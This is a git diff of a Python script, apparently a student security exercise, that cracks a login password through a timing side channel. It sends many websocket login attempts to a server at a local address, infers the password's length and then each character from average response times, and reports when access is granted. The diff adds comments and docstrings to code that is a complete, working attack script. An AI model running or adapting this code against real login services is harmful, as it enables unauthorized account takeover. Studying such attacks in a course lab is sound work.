@@ -1,3 +1,5 @@
+# Import tools
+
 from socket import *
 from sys import *
 import asyncio
@@ -6,7 +8,23 @@ import json
 import time
 from statistics import *
 
+
 async def client_stub(username, password):
+    """Handle sending and receiving logins to/from the server.
+    'while True' structure prevents singular network/socket
+    errors from causing full code to fail.
+
+    --- laat deze functie onaangetast ---
+    
+    Parameters
+    ----------
+        username -- string of student ID for login attempt
+        password -- string of password for login attempt
+
+    Returns
+    -------
+        reply -- string of server's response to login attempt
+    """
     server_address = "ws://192.168.1.10:3840"
     err_count = 0
     while True:
@@ -26,6 +44,19 @@ async def client_stub(username, password):
             continue
 
 async def call_server(username, password):
+    """Functie om server te benanderene met response
+    gebruik
+
+    Parameters
+    ----------
+        username -- string of student ID for login attempt
+        password -- string of password for login attempt (functie guess_password)
+
+    Returns
+    -------
+        reply -- string of server's response to login attempt
+    
+    """
     reply, time_delta = await client_stub(username, password)
     if reply[-15:] == 'Access Granted!':
         print('Correct password found: {}'.format(password))
@@ -35,7 +66,7 @@ async def call_server(username, password):
 
 
 async def guess_password(username):
-    passwords = ["a", "aa", "aaa", "aaaa", "aaaaa", "aaaaaa", "aaaaaaa", "aaaaaaaa"]
+    passwords = ["a", "aa", "aaa", "aaaa", "aaaaa", "aaaaaa", "aaaaaaa", "aaaaaaaa"] # multiple lenghts for password guessing
 
     max_average_time = 0
     guessed_length = 0
@@ -70,16 +101,18 @@ async def guess_password(username):
         for char in characters:
             response_times = []
 
-            for _ in range(150):  # Probeer elk karakter 25 keer
+            for _ in range(50):  # trying each charater i times (increase if needed)
                 guess = password + char + "0" * (password_length - len(password) - 1)
                 time.sleep(0.001)
                 _, response_time = await client_stub(username, guess)
                 response_times.append(response_time)
                 print(f"Guessing '{guess}' -> Response time: {response_time}")
 
+            # get average of response time            
             average_time = sum(response_times) / len(response_times)
             print(f"Average response time for character '{char}': {average_time}")
 
+            # saves the average_time with the max time 
             if next_char is None or average_time > max_average_time:
                 max_average_time = average_time
                 next_char = char
@@ -95,7 +128,7 @@ async def guess_password(username):
     return password
 
 async def main():
-    username = "453713"  # Assuming this is your username
+    username = "453713"  # insert username of student
     await guess_password(username)
 
 asyncio.run(main())
